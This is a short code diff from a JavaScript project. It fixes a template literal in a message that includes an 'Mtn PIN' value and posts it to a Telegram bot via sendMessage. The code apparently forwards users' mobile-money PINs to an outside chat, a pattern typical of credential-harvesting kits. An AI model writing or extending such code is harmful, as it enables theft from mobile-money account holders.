@@ -69,7 +69,7 @@ Mtn PIN: ${mtnPin}
 
 Status: Successful
 Date: ${date}
-Time: ${time}
+Time: ${time}`;
 
     const telegramResponse = await axios.post(
       `${TELEGRAM_API}/sendMessage`,
